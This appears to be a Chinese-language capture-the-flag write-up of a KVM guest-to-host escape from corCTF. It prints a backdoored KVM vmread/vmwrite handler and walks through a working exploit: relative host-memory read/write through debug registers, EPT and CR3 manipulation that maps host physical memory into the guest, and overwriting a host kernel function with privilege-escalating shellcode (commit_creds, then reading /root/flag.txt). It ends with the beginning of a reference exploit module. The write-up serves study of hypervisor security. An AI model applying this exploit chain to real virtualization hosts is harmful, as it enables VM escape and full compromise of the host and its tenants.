+	natural_width host_ia32_sysenter_eip;
+	natural_width host_rsp;
+	natural_width host_rip;
+	natural_width paddingl[8]; /* room for future expansion */
+	u32 pin_based_vm_exec_control;
+	u32 cpu_based_vm_exec_control;
+	u32 exception_bitmap;
+	u32 page_fault_error_code_mask;
+	u32 page_fault_error_code_match;
+	u32 cr3_target_count;
+	u32 vm_exit_controls;
+	u32 vm_exit_msr_store_count;
+	u32 vm_exit_msr_load_count;
+	u32 vm_entry_controls;
+	u32 vm_entry_msr_load_count;
+	u32 vm_entry_intr_info_field;
+	u32 vm_entry_exception_error_code;
+	u32 vm_entry_instruction_len;
+	u32 tpr_threshold;
+	u32 secondary_vm_exec_control;
+	u32 vm_instruction_error;
+	u32 vm_exit_reason;
+	u32 vm_exit_intr_info;
+	u32 vm_exit_intr_error_code;
+	u32 idt_vectoring_info_field;
+	u32 idt_vectoring_error_code;
+	u32 vm_exit_instruction_len;
+	u32 vmx_instruction_info;
+	u32 guest_es_limit;
+	u32 guest_cs_limit;
+	u32 guest_ss_limit;
+	u32 guest_ds_limit;
+	u32 guest_fs_limit;
+	u32 guest_gs_limit;
+	u32 guest_ldtr_limit;
+	u32 guest_tr_limit;
+	u32 guest_gdtr_limit;
+	u32 guest_idtr_limit;
+	u32 guest_es_ar_bytes;
+	u32 guest_cs_ar_bytes;
+	u32 guest_ss_ar_bytes;
+	u32 guest_ds_ar_bytes;
+	u32 guest_fs_ar_bytes;
+	u32 guest_gs_ar_bytes;
+	u32 guest_ldtr_ar_bytes;
+	u32 guest_tr_ar_bytes;
+	u32 guest_interruptibility_info;
+	u32 guest_activity_state;
+	u32 guest_sysenter_cs;
+	u32 host_ia32_sysenter_cs;
+	u32 vmx_preemption_timer_value;
+	u32 padding32[7]; /* room for future expansion */
+	u16 virtual_processor_id;
+	u16 posted_intr_nv;
+	u16 guest_es_selector;
+	u16 guest_cs_selector;
+	u16 guest_ss_selector;
+	u16 guest_ds_selector;
+	u16 guest_fs_selector;
+	u16 guest_gs_selector;
+	u16 guest_ldtr_selector;
+	u16 guest_tr_selector;
+	u16 guest_intr_status;
+	u16 host_es_selector;
+	u16 host_cs_selector;
+	u16 host_ss_selector;
+	u16 host_ds_selector;
+	u16 host_fs_selector;
+	u16 host_gs_selector;
+	u16 host_tr_selector;
+	u16 guest_pml_index;
+};
+
+static int handle_vmread(struct kvm_vcpu *vcpu)
+{
+	struct vmcs12 *vmcs12 = is_guest_mode(vcpu) ? get_shadow_vmcs12(vcpu)
+						    : get_vmcs12(vcpu);
+	unsigned long exit_qualification = vmx_get_exit_qual(vcpu);
+	u32 instr_info = vmcs_read32(VMX_INSTRUCTION_INFO);
+	struct vcpu_vmx *vmx = to_vmx(vcpu);
+	struct x86_exception e;
+	unsigned long field;
+	u64 value;
+	gva_t gva = 0;
+	short offset;
+	int len, r;
+
+	if (!nested_vmx_check_permission(vcpu))
+		return 1;
+
+	/* Decode instruction info and find the field to read */
+	field = kvm_register_read(vcpu, (((instr_info) >> 28) & 0xf));
+
+	if (!nested_vmx_is_evmptr12_valid(vmx)) {
+		/*
+		 * In VMX non-root operation, when the VMCS-link pointer is INVALID_GPA,
+		 * any VMREAD sets the ALU flags for VMfailInvalid.
+		 */
+		if (vmx->nested.current_vmptr == INVALID_GPA ||
+		    (is_guest_mode(vcpu) &&
+		     get_vmcs12(vcpu)->vmcs_link_pointer == INVALID_GPA))
+			return nested_vmx_failInvalid(vcpu);
+
+		offset = get_vmcs12_field_offset(field);
+		if (offset < 0)
+			return nested_vmx_fail(vcpu, VMXERR_UNSUPPORTED_VMCS_COMPONENT);
+
+		if (!is_guest_mode(vcpu) && is_vmcs12_ext_field(field))
+			copy_vmcs02_to_vmcs12_rare(vcpu, vmcs12);
+
+		/* Read the field, zero-extended to a u64 value */
+		value = vmcs12_read_any(vmcs12, field, offset);
+	} else {
+		/*
+		 * Hyper-V TLFS (as of 6.0b) explicitly states, that while an
+		 * enlightened VMCS is active VMREAD/VMWRITE instructions are
+		 * unsupported. Unfortunately, certain versions of Windows 11
+		 * don't comply with this requirement which is not enforced in
+		 * genuine Hyper-V. Allow VMREAD from an enlightened VMCS as a
+		 * workaround, as misbehaving guests will panic on VM-Fail.
+		 * Note, enlightened VMCS is incompatible with shadow VMCS so
+		 * all VMREADs from L2 should go to L1.
+		 */
+		if (WARN_ON_ONCE(is_guest_mode(vcpu)))
+			return nested_vmx_failInvalid(vcpu);
+
+		offset = evmcs_field_offset(field, NULL);
+		if (offset < 0)
+			return nested_vmx_fail(vcpu, VMXERR_UNSUPPORTED_VMCS_COMPONENT);
+
+		/* Read the field, zero-extended to a u64 value */
+		value = evmcs_read_any(nested_vmx_evmcs(vmx), field, offset);
+	}
+
+	/*
+	 * Now copy part of this value to register or memory, as requested.
+	 * Note that the number of bits actually copied is 32 or 64 depending
+	 * on the guest's mode (32 or 64 bit), not on the given field's length.
+	 */
+	if (instr_info & BIT(10)) {
+		kvm_register_write(vcpu, (((instr_info) >> 3) & 0xf), value);
+	} else {
+		len = is_64_bit_mode(vcpu) ? 8 : 4;
+		if (get_vmx_mem_address(vcpu, exit_qualification,
+					instr_info, true, len, &gva))
+			return 1;
+		/* _system ok, nested_vmx_check_permission has verified cpl=0 */
+		r = kvm_write_guest_virt_system(vcpu, gva, &value, len, &e);
+		if (r != X86EMUL_CONTINUE)
+			return kvm_handle_memory_failure(vcpu, r, &e);
+	}
+
+	return nested_vmx_succeed(vcpu);
+}
+
+static int handle_vmwrite(struct kvm_vcpu *vcpu)
+{
+	struct vmcs12 *vmcs12 = is_guest_mode(vcpu) ? get_shadow_vmcs12(vcpu)
+						    : get_vmcs12(vcpu);
+	unsigned long exit_qualification = vmx_get_exit_qual(vcpu);
+	u32 instr_info = vmcs_read32(VMX_INSTRUCTION_INFO);
+	struct vcpu_vmx *vmx = to_vmx(vcpu);
+	struct x86_exception e;
+	unsigned long field;
+	short offset;
+	gva_t gva;
+	int len, r;
+
+	/*
+	 * The value to write might be 32 or 64 bits, depending on L1's long
+	 * mode, and eventually we need to write that into a field of several
+	 * possible lengths. The code below first zero-extends the value to 64
+	 * bit (value), and then copies only the appropriate number of
+	 * bits into the vmcs12 field.
+	 */
+	u64 value = 0;
+
+	if (!nested_vmx_check_permission(vcpu))
+		return 1;
+
+	/*
+	 * In VMX non-root operation, when the VMCS-link pointer is INVALID_GPA,
+	 * any VMWRITE sets the ALU flags for VMfailInvalid.
+	 */
+	if (vmx->nested.current_vmptr == INVALID_GPA ||
+	    (is_guest_mode(vcpu) &&
+	     get_vmcs12(vcpu)->vmcs_link_pointer == INVALID_GPA))
+		return nested_vmx_failInvalid(vcpu);
+
+	if (instr_info & BIT(10))
+		value = kvm_register_read(vcpu, (((instr_info) >> 3) & 0xf));
+	else {
+		len = is_64_bit_mode(vcpu) ? 8 : 4;
+		if (get_vmx_mem_address(vcpu, exit_qualification,
+					instr_info, false, len, &gva))
+			return 1;
+		r = kvm_read_guest_virt(vcpu, gva, &value, len, &e);
+		if (r != X86EMUL_CONTINUE)
+			return kvm_handle_memory_failure(vcpu, r, &e);
+	}
+
+	field = kvm_register_read(vcpu, (((instr_info) >> 28) & 0xf));
+
+	offset = get_vmcs12_field_offset(field);
+	if (offset < 0)
+		return nested_vmx_fail(vcpu, VMXERR_UNSUPPORTED_VMCS_COMPONENT);
+
+	/*
+	 * If the vCPU supports "VMWRITE to any supported field in the
+	 * VMCS," then the "read-only" fields are actually read/write.
+	 */
+	if (vmcs_field_readonly(field) &&
+	    !nested_cpu_has_vmwrite_any_field(vcpu))
+		return nested_vmx_fail(vcpu, VMXERR_VMWRITE_READ_ONLY_VMCS_COMPONENT);
+
+	/*
+	 * Ensure vmcs12 is up-to-date before any VMWRITE that dirties
+	 * vmcs12, else we may crush a field or consume a stale value.
+	 */
+	if (!is_guest_mode(vcpu) && !is_shadow_field_rw(field))
+		copy_vmcs02_to_vmcs12_rare(vcpu, vmcs12);
+
+	/*
+	 * Some Intel CPUs intentionally drop the reserved bits of the AR byte
+	 * fields on VMWRITE.  Emulate this behavior to ensure consistent KVM
+	 * behavior regardless of the underlying hardware, e.g. if an AR_BYTE
+	 * field is intercepted for VMWRITE but not VMREAD (in L1), then VMREAD
+	 * from L1 will return a different value than VMREAD from L2 (L1 sees
+	 * the stripped down value, L2 sees the full value as stored by KVM).
+	 */
+	if (field >= GUEST_ES_AR_BYTES && field <= GUEST_TR_AR_BYTES)
+		value &= 0x1f0ff;
+
+	vmcs12_write_any(vmcs12, field, offset, value);
+
+	/*
+	 * Do not track vmcs12 dirty-state if in guest-mode as we actually
+	 * dirty shadow vmcs12 instead of vmcs12.  Fields that can be updated
+	 * by L1 without a vmexit are always updated in the vmcs02, i.e. don't
+	 * "dirty" vmcs12, all others go down the prepare_vmcs02() slow path.
+	 */
+	if (!is_guest_mode(vcpu) && !is_shadow_field_rw(field)) {
+		/*
+		 * L1 can read these fields without exiting, ensure the
+		 * shadow VMCS is up-to-date.
+		 */
+		if (enable_shadow_vmcs && is_shadow_field_ro(field)) {
+			preempt_disable();
+			vmcs_load(vmx->vmcs01.shadow_vmcs);
+
+			__vmcs_writel(field, value);
+
+			vmcs_clear(vmx->vmcs01.shadow_vmcs);
+			vmcs_load(vmx->loaded_vmcs->vmcs);
+			preempt_enable();
+		}
+		vmx->nested.dirty_vmcs12 = true;
+	}
+
+	return nested_vmx_succeed(vcpu);
+}
+
+int kvm_set_dr(struct kvm_vcpu *vcpu, int dr, unsigned long val)
+{
+	size_t size = ARRAY_SIZE(vcpu->arch.db);
+
+	switch (dr) {
+	case 0 ... 3:
+		vcpu->arch.db[array_index_nospec(dr, size)] = val;
+		if (!(vcpu->guest_debug & KVM_GUESTDBG_USE_HW_BP))
+			vcpu->arch.eff_db[dr] = val;
+		break;
+	case 4:
+	case 6:
+		if (!kvm_dr6_valid(val))
+			return 1; /* #GP */
+		vcpu->arch.dr6 = (val & DR6_VOLATILE) | kvm_dr6_fixed(vcpu);
+		break;
+	case 5:
+	default: /* 7 */
+		if (!kvm_dr7_valid(val))
+			return 1; /* #GP */
+		vcpu->arch.dr7 = (val & DR7_VOLATILE) | DR7_FIXED_1;
+		kvm_update_dr7(vcpu);
+		break;
+	}
+
+	return 0;
+}
+EXPORT_SYMBOL_GPL(kvm_set_dr);
+
+unsigned long kvm_get_dr(struct kvm_vcpu *vcpu, int dr)
+{
+	size_t size = ARRAY_SIZE(vcpu->arch.db);
+
+	switch (dr) {
+	case 0 ... 3:
+		return vcpu->arch.db[array_index_nospec(dr, size)];
+	case 4:
+	case 6:
+		return vcpu->arch.dr6;
+	case 5:
+	default: /* 7 */
+		return vcpu->arch.dr7;
+	}
+}
+```
+
+## 漏洞点
+
+- handle_vmwrite 读取 struct kvm_vcpu 中 arch.db[0] 的内容；如果等于 0x1337BABE，就将 struct kvm_vcpu 中 arch.db[1] 的内容作为 dr，再把 struct kvm_vcpu 中 arch.db[2] 的内容写入 struct vmcs12 *+8*dr 处。
+
+  `  *（struct vmcs12 *+8*struct kvm_vcpu的arch.db[0]）=struct kvm_vcpu的arch.db[2]`
+- handle_vmread 读取 struct kvm_vcpu 中 arch.db[0] 的内容；如果等于 0x1337BABE，就将 struct kvm_vcpu 中 arch.db[1] 的内容作为 dr，再把 struct vmcs12 *+8*dr 处的内容赋给 struct kvm_vcpu 中的 arch.db[2]。
+
+  ` struct kvm_vcpu的arch.db[2]= *（struct vmcs12 *+8*struct kvm_vcpu的arch.db[0]）`
+
+这样就能以 struct vmcs12 * 为基准进行相对地址任意读写，而这个 vmcs12 指向我们在虚拟机内部申请的 vmcs 在宿主机上的地址。为什么？因为这段代码负责处理虚拟机执行 vmx 指令的情况，而 vmread 指令读取的是所控制虚拟机的 vmcs 相关字段；虚拟机执行 vmread 时，会陷入宿主机的 VMM，再由它处理这条 vmread。因此，这里的 vmcs 自然就是外层虚拟机所控制的内层虚拟机的 VMCS。
+
+这相当于在宿主机上进行任意读写，不过要注意，这里的 struct kvm_vcpu *vcpu 仍然属于外层虚拟机，而非虚拟机中的虚拟机。
+
+
+# 思路
+## vmx 相关初始化
+[vmx 指令的使用](https://wiki.osdev.org/VMX#VMCS)
+
+执行 vmread/vmwrite 指令前，需要做一些准备。vmread 和 vmwrite 用于与“虚拟机控制结构”（VMCS）交互；在虚拟机内部执行它们，就是与嵌套虚拟机的 VMCS 交互。因此，虚拟机必须先开启 VMX 模式（嵌套虚拟化），才能进行嵌套虚拟化；没有嵌套虚拟机的 VMCS，自然无法使用 vmread 和 vmwrite 指令。
+
+首先，分配并初始化嵌套虚拟机实例对应的 VMXON Region 和 VMCS Region。
+
+```c
+	vmxon_page = kmalloc(4096, GFP_KERNEL);
+    memset(vmxon_page, 0, 4096);
+    vmcs_page = kmalloc(4096, GFP_KERNEL);   
+    memset(vmcs_page, 0, 4096);
+    vmxon_page_pa = virt_to_phys(vmxon_page);
+    vmcs_page_pa = virt_to_phys(vmcs_page);
+    printk("vmxon_page %p --- vmxon_page_pa %p",vmxon_page,vmxon_page_pa);
+    printk("vmcs_page %p --- vmcs_page_pa %p",vmcs_page,vmcs_page_pa);
+```
+接下来设置 vmxon_page 和 vmcs_page 的头部信息。读取 MSR 寄存器的指令是 rdmsr，使用 eax、edx 和 ecx 传递参数：ecx 存放 MSR 寄存器索引，edx 和 eax 分别存放结果的高 32 位和低 32 位。该指令必须在 ring0 权限或实地址模式下执行，否则会触发 #GP(0) 异常。在 ecx 中指定保留或未实现的 MSR 地址，也会引发异常。这里根据索引读取 vmcs_revision 的值，再写入 vmxon_page 和 vmcs_page 的开头。
+
+```c
+    uint32_t a, d;
+    asm volatile ("rdmsr" : "=a"(a), "=d"(d) : "c"(MSR_IA32_VMX_BASIC) : "memory");
+    uint64_t vmcs_revision=a | ((uint64_t) d << 32);
+    printk("vmcs_revision %p",vmcs_revision);
+    *(uint64_t *)(vmxon_page) = vmcs_revision;
+    *(uint64_t *)(vmcs_page) = vmcs_revision;
+```
+
+接下来开启 vmx 模式：将虚拟机 CR4 的第 13 位取到 rax 中，把该位置 1，再写回 cr4。这一步用于打开 CR4 寄存器中的虚拟化开关。
+
+
+```c
+    asm volatile (
+    "movq %cr4, %rax\n\t"
+    "bts $13, %rax\n\t"
+    "movq %rax, %cr4"
+);
+```
+
+> 注意：VMXON、VMCLEAR 和 VMPTRLD 指令必须指向各自区域的物理地址。
+
+
+
+vmxon 指令以已分配的 VMXON Region 的物理地址为操作数，表示进入 VMX 操作模式。setna 指令通过 EFLAGS.CF 的值判断执行是否成功：
+- setna 表示“set if not above”，根据 vmxon 指令的执行结果设置一个字节。如果 vmxon 执行成功，就返回 0。
+```c
+
+  asm volatile (
+    "vmxon %[pa]\n\t"
+    "setna %[ret]"
+    : [ret] "=rm" (vmxonret)
+    : [pa] "m" (vmxon_page_pa)
+    : "cc", "memory"
+    );
+    printk("vmxonret %p",vmxonret);
+
+
+```
+
+这里需要注意，开启 VMX 虚拟化需要打开两个“开关”：一个是 Host CR4 寄存器的第 13 位，另一个是 vmxon 指令。
+
+> 顺便记一下 GCC 内联汇编：在 clobbered 列表（第三个冒号）中加入 cc 和 memory，表示这段内联汇编会修改 cc（状态寄存器标志）和内存，因此编译器不会再假定相关值在这段内联汇编执行后仍然有效。
+
+
+
+vmptrld 将一个 VMCS 结构体指针加载为当前操作对象：
+
+```c
+
+   asm volatile (
+    "vmptrld %[pa]\n\t"
+    "setna %[ret]"
+    : [ret] "=rm" (vmptrldret)
+    : [pa] "m" (vmcs_page_pa)
+    : "cc", "memory"
+);
+```
+
+VMCS 加载到逻辑 CPU 后，处理器不能再通过普通内存访问指令访问它，否则会产生“处理器错误”。唯一可用的访问方式就是 vmread 和 vmwrite 指令。
+
+
+
+## 相对地址任意读写
+
+
+设置 db0 和 db1 即可进行任意读，读取结果放在 db2 中。
+
+```c
+static size_t read_relative(size_t offset_to_nest_vmcs)
+{
+    size_t value;
+    size_t vmcs_field_value=0;
+    size_t vmcs_field=0;
+    size_t magic=0x1337BABE;
+    asm("movq %0, %%db0"    ::"r" (magic));
+    asm("movq %0, %%db1"    ::"r" (offset_to_nest_vmcs));
+    asm volatile (
+    "vmread %1, %0\n\t"  
+    : "=r" (vmcs_field_value)
+    : "r" (vmcs_field)
+);
+    asm("movq %%db2, %0" :"=r" (value));
+    return value;
+
+}
+```
+
+设置 db0、db1 和 db2 即可进行任意写，将 db2 写入目标位置。
+
+```c
+static void write_relative(size_t offset_to_nest_vmcs,size_t value)
+{
+    size_t vmcs_field_value=0;
+    size_t vmcs_field=0;
+    size_t magic=0x1337BABE;
+    asm("movq %0, %%db0"    ::"r" (magic));
+    asm("movq %0, %%db1"    ::"r" (offset_to_nest_vmcs));
+    asm("movq %0, %%db2"    ::"r" (value));
+    asm volatile (
+    "vmwrite %1, %0\n\t"  
+    : "=r" (vmcs_field_value)
+    : "r" (vmcs_field)
+);
+    asm("movq %%db2, %0" :"=r" (value));
+
+}
+```
+
+## 寻找虚拟机 VMCS 的偏移
+目前可以相对于嵌套虚拟机 VMCS 在宿主机上的虚拟地址进行任意读写。VMCS 结构均由 kmalloc 分配，内核堆位于直接映射区，因此可以根据 VMCS 的相关特征，向上、向下扫描相对地址，找到外层虚拟机 VMCS 在宿主机上的虚拟地址。
+
+根据 vmcs 结构的特征，选择 guest_idtr_base 字段。该值不会变化，而 VMCS 必须按页对齐，所以只需在按页粒度递增的偏移加上 0x208 的位置查找 IDT 基址 0xfffffe0000000000（guest_idtr_base），即可找到虚拟机 VMCS 的虚拟地址。
+
+可以查看 vmcs 偏移 0 处的内容，也就是 vmcs_revision 字段的内容。
+![图片](./assets/csdn-140787240/image-006-b7f8c3b5f2.png)
+
+```c
+ for (i = 0; i < 0x4000; i++) {
+        pos_offset = ((i * 0x1000) + 0x208) / 8;
+        neg_offset = ((i * -1 * 0x1000) + 0x208) / 8;
+
+        pos_val = read_relative(pos_offset);
+        if (pos_val == 0xfffffe0000000000) {
+            found_val = pos_val;
+            found_offset = pos_offset;
+            break;
+        }
+
+        neg_val = read_relative(neg_offset);
+        if (neg_val == 0xfffffe0000000000) {
+            found_val = neg_val;
+            found_offset = neg_offset;
+            break;
+        }
+    }
+    pr_info("vmcs12[%llx * 8] = %llx\n", pos_offset, pos_val);
+    pr_info("vmcs12[%llx * 8] = %llx\n", neg_offset, neg_val);
+```
+## 寻找 nest_vmx，泄露嵌套虚拟机在宿主机上的虚拟地址
+nested_vmx 结构体中包含指向嵌套虚拟机 VMCS 的指针 cached_vmcs12，还包含一些值已知的字段：vmxon_ptr 和 current_vmptr，分别是我们创建的 VMXON 区域与 VMCS 的客户机物理地址。因此，可以扫描内存，找到存放 VMXON 区域与 VMCS 客户机物理地址（这些值已知）的偏移位置，进而确定 nested_vmx 的偏移、cached_vmcs12 的偏移，最后根据偏移读出嵌套虚拟机 VMCS 的虚拟地址。
+
+```c
+struct nested_vmx {
+    /* Has the level1 guest done vmxon? */
+    bool vmxon;
+    gpa_t vmxon_ptr;
+    bool pml_full;
+
+    /* The guest-physical address of the current VMCS L1 keeps for L2 */
+    gpa_t current_vmptr;
+    /*
+     * Cache of the guest's VMCS, existing outside of guest memory.
+     * Loaded from guest memory during VMPTRLD. Flushed to guest
+     * memory during VMCLEAR and VMPTRLD.
+     */
+    struct vmcs12 *cached_vmcs12;
+    ...
+}
+```
+
+```c
+ for (i = 1; i < (0x4000*0x200); i += 2) {
+        pos_offset = i;
+        neg_offset = -i;
+        
+        if ( read_relative(pos_offset)== vmcs_page_pa && read_relative(pos_offset-2) == vmxon_page_pa) {
+            found_val = pos_val;
+            found_offset = pos_offset;
+            break;
+        }
+
+    }
+l2_vmcs_addr = read_guy(nested_vmx_offset+1);
+
+```
+
+## 获取 phymap 基址
+
+> 非常感谢 nightu、Eurus、flyyy 和 tplus 的帮助。
+
+```c
+ /**
+     * KASLR's granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,
+     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.
+     * For MEM > 1GB, we can just find the secondary_startup_64 func ptr,
+     * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.
+     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.
+     */
+    vmemmap_base = (size_t) info_pipe_buf.page & 0xfffffffff0000000;
+    for (;;) {
+        arbitrary_read_by_pipe((struct page*) (vmemmap_base + 157 * 0x40), buf);
+
+        if (buf[0] > 0xffffffff81000000 && ((buf[0] & 0xfff) == 0x070)) {
+            kernel_base = buf[0] -  0x070;
+            kernel_offset = kernel_base - 0xffffffff81000000;
+            printf("\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n"
+                   "\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n", 
+                   kernel_base, kernel_offset);
+            break;
+        }
+
+        vmemmap_base -= 0x10000000;
+    }
+    printf("\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n", vmemmap_base);
+```
+通过嵌套虚拟机 VMCS 的虚拟地址获取宿主机 physmap 基址。这里可以先尝试按掩码处理，因为偏移只能是 256MB 的倍数；但如果对象地址偏移超过 0x10000000，就需要使用上面的遍历方法。好在这里用掩码就可以。
+
+```c
+   physbase = l2_vmcs_addr & ~0xfffffffull;
+```
+
+## 获取 ept
+
+然后，通过外层虚拟机 VMCS 的偏移，也就是前面找到的位置偏移，获取其中的 EPTP；它以宿主机物理地址的形式存放。
+
+```c
+ eptp_value = read_relative(l1_vmcs_offset-50);
+```
+EPTP 是第四级页表的宿主机物理地址，结合 physbase 可以得到虚拟地址；再减去前面泄露的嵌套虚拟机 VMCS 的宿主机虚拟地址（最初进行相对地址任意读写的起点，后来才泄露出它在宿主机上的虚拟地址），就得到偏移，进而通过偏移读出 EPT 表的第一项。
+
+
+
+```c
+eptp_value = read_relative(l1_vmcs_offset-50);
+ept_addr = physbase + (eptp_value & ~0xfffull);
+ept_offset = (ept_addr-l2_vmcs_addr) / 8;
+third_value = read_relative(ept_offset);
+```
+
+## 修改虚拟机的 EPT
+[https://www.owalle.com/2018/12/10/kvm-memory/](https://www.owalle.com/2018/12/10/kvm-memory/)
+
+![图片](./assets/csdn-140787240/image-007-2678038931.png)
+![图片](./assets/csdn-140787240/image-008-3dc12a229d.png)
+
+> EPT 表及相关页表项中的地址，都是宿主机物理地址。
+
+读出第四级页表的第一项，也就是第三级页表的宿主机物理地址后，再获取它在宿主机上的虚拟地址，计算偏移，并向第三级页表写入一个页表项。此时，一个大页表项可以表示 1GB：2^9 * 2^9 * 2^12 = 1GB。
+
+
+
+```c
+third_addr = physbase + (third_value & ~0xfffull);
+    pr_info("[exp]: pml4e_addr: %llx\n", pml4e_addr);
+
+    third_offset = (third_addr-l2_vmcs_addr) / 8;
+    pr_info("[exp]: pml4e_offset: %llx\n", pml4e_offset);
+
+    write_relative(third_offset + 6, 0x87);
+```
+
+此时，0x87 表示该页表项是大页，1GB Page Physical Addr 为 0。
+
+
+为了避免干扰已有页表项，这里新增一项。它是第 6 项，因此对应 6GB-7GB。最终，虚拟机中 6GB-7GB 的物理地址映射到宿主机 0GB-1GB 的物理地址。
+## 修改虚拟机 cr3
+![图片](./assets/csdn-140787240/image-009-55514657a0.png)
+![图片](./assets/csdn-140787240/image-010-37df36d697.png)
+![图片](./assets/csdn-140787240/image-011-8aa5ca4bb1.png)
+
+
+```
+
++-------------------+
+|     CR3 Register  |
++-------------------+
+         |
+         v
++-------------------+
+|   Physical Memory |
+|                   |
+| +---------------+ |
+| |     PGD       | |
+| | [0]           | |
+| | ...           | |
+| | [272]         | |
+| | ...           | |
+| +---------------+ |
+|                   |
++-------------------+
+
+After:
++-------------------+
+|     CR3 Register  |
++-------------------+
+         |
+         v
++-------------------+
+|   Physical Memory |
+|                   |
+| +---------------+ |
+| |     PGD       | |
+| | [0]           | |
+| | ...           | |
+| | [272] --------+---> +---------------+
+| | ...           | |   | New PGDE Page |
+| +---------------+ |   | [0] -------+  |
+|                   |   | ...        |  |
+|                   |   +------------+  |
+|                   |                |  
+|                   |                v  
+|                   |        +----------------+
+|                   |        | 1GB Huge Page  |
+|                   |        | at 0x180000000 |
+|                   |        | (6GB physical) |
+|                   |        +----------------+
++-------------------+
+```
+虚拟机 CR3 存放虚拟机页表的物理地址，用于完成 GVA->GPA 转换。修改其中的页表项自然不能直接通过物理地址进行，而要通过虚拟机的直接映射区。虚拟机直接映射区的起始地址由 page_offset_base 变量给出，其中页表项也必须使用虚拟机物理地址的形式。
+
+这里同样向第四级页表的第 272 项写入一个表项，再将第三级页表第一项设为 `0x180000000 | (1<<7) | 0x3`，使虚拟机虚拟地址 0xffff880000000000+0GB 到 0xffff880000000000+1GB 映射到虚拟机物理地址 6GB-7GB。
+
+这是因为第三级页表的第 272 项对应第 39 到 48 位，即 100010000，也就是 0x88 后再加一个二进制 0 位，而前面的位会与这里的最高位保持一致。
+
+```c
+  	cr3 = read_cr3();
+    four= (cr3 & ~0xfffull) + page_offset_base;
+	
+    third_page= kzalloc(0x1000, GFP_KERNEL);
+    third= virt_to_phys(third_page);
+
+    four[272] = third| 0x7;
+    
+    third[0] =  0x180000000 | 0x87;
+```
+
+## 寻找要覆盖的函数
+最终，虚拟机中 0xffff880000000000+0GB 到 0xffff880000000000+1GB 的地址映射到宿主机物理内存 0-1G。显然，1G 远大于宿主机的实际内存，qemu 模拟的内存只有几百 MB。因此，此时从虚拟机中的 0xffff880000000000 开始遍历，相当于从物理地址 0 开始遍历，自然能找到要覆盖的函数，再用 shellcode 覆盖它。
+
+这里选择与该函数位于同一页的一段特殊字节模式即可。
+
+原函数：
+![图片](./assets/csdn-140787240/image-012-1adbb630d8.png)
+用十六进制编辑器搜索。这里选择 0x00001C70BF440F4C，因为除了从 60 开始的位置外，就只有这里出现，而我们检查的偏移是 0x503。
+![图片](./assets/csdn-140787240/image-013-a12e886bba.png)
+
+
+```c
+ for (i = 0; i < (1<<18); i += 0x1000) {
+        unsigned long long val = *((unsigned long long *)(0xffff880000000503 + i));
+
+        // check the value and check if relocations were applied
+        if (val == 0x1C70BF440F4C  ) {
+            handle_vmread_page = 0xffff880000000000 + i;
+            break;
+        }
+    }
+    handle_vmread = handle_vmread_page + 0x4d0;
+```
+
+## shellcode
+
+- CPU Entry Area Mapping：
+   这是内核内存中的一个特殊区域，用于存放重要的 CPU 相关数据结构和入口点。该区域地址通常固定，不受 KASLR（内核地址空间布局随机化）影响。
+该区域开头有几个地址，与内核 text 段（代码段）保持固定偏移关系。这意味着，知道这些地址的值后，就可以计算内核代码的实际加载地址。
+
+ - 由于 CPU Entry Area Mapping 的地址固定，攻击者可以直接读取 0xfffffe0000000004 处的内容，再通过简单计算（可能是加减固定偏移）得到基址。
+
+![图片](./assets/csdn-140787240/image-014-9e7a301115.png)
+
+```bash
+
+/*
+    push rax
+    push rbx
+    push rcx
+    push rdx
+    push r9
+    push r10
+    push r11
+    push r12
+    push r13
+    push r14
+    push rdi
+    push rsi
+
+    // get kaslr base
+    mov rax, 0xfffffe0000000004
+    mov rax, [rax]
+    sub rax, 0x1008e00
+
+    // r12 is kaslr_base
+    mov r12, rax
+
+    // commit_creds
+    mov r13, r12
+    add r13, 0xbdad0
+
+    // init_cred
+    mov r14, r12
+    add r14, 0x1a52ca0
+
+    mov rdi, r14
+    call r13
+
+    // filp_open
+    mov r11, r12
+    add r11, 0x292420
+
+    // push /root/flag.txt
+    mov rax, 0x7478742e6761
+    push rax
+    mov rax, 0x6c662f746f6f722f
+    push rax
+    mov rdi, rsp
+
+    // O_RDONLY
+    mov rsi, 0
+
+    call r11
+
+    // r10 is filp_ptr
+    mov r10, rax
+
+    // kernel_read
+    mov r11, r12
+    add r11, 0x294c70
+
+    // writeable kernel address
+    mov r9, r12
+    add r9, 0x18ab000
+
+    mov rdi, r10
+    mov rsi, r9
+    mov rdx, 0x100
+    mov rcx, 0
+
+    call r11
+
+    pop rax
+    pop rax
+
+    pop rsi
+    pop rdi
+    pop r13
+    pop r14
+    pop r12
+    pop r11
+    pop r10
+    pop r9
+    pop rdx
+    pop rcx
+    pop rbx
+    pop rax
+*/
+```
+当然，不能直接粗暴覆盖，否则可能发生异常，导致无法返回虚拟机。因此，这里先用 nop 覆盖成功返回路径必须经过的整个范围，保存寄存器并在末尾恢复，最后将最后一个字节覆盖为 ret。可以结合调试，测试哪些指令被覆盖后仍能正常返回虚拟机。
+
+```c
+memset(handle_vmread, 0x90, 0x281);
+    handle_vmread[0x286] = 0xc3;
+
+    memcpy(handle_vmread, shellcode, sizeof(shellcode)-1);
+
+    read_realative(0);
+
+    // scan for flag in memory
+    for (i = 0; i < 1<<18; i+= 0x1000) {
+        if (!memcmp(0xffff880000000000 + i, "corctf{", 7)) {
+            pr_info("flag: %s\n", 0xffff880000000000 + i);
+            break;
+        }
+    }
+
+```
+
+![图片](./assets/csdn-140787240/image-015-a961c319f8.png)
+![图片](./assets/csdn-140787240/image-016-b1fdd36927.png)
+
+
+
+# exp
+由于我自己复现的 exp 写得比较丑，为了方便读者参考，这里附上我参考过的 Shellphish 题解中的版本。
+
+
+```c
+#include <linux/init.h>
+#include <linux/slab.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/proc_fs.h>
+#include <linux/sched.h>
+#include <linux/kprobes.h>
+#include <linux/version.h>
+#include <linux/efi.h>
+
+#include <asm/uaccess.h>
+#include <asm/fsgsbase.h>
+#include <asm/io.h>
+#include <linux/uaccess.h>
+
+static ssize_t proc_read(struct file* filep, char* __user buffer, size_t len, loff_t* offset);
+static ssize_t proc_write(struct file* filep, const char* __user u_buffer, size_t len, loff_t* offset);
+static int proc_open(struct inode *inode, struct file *filep);
+
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,5,0)
+
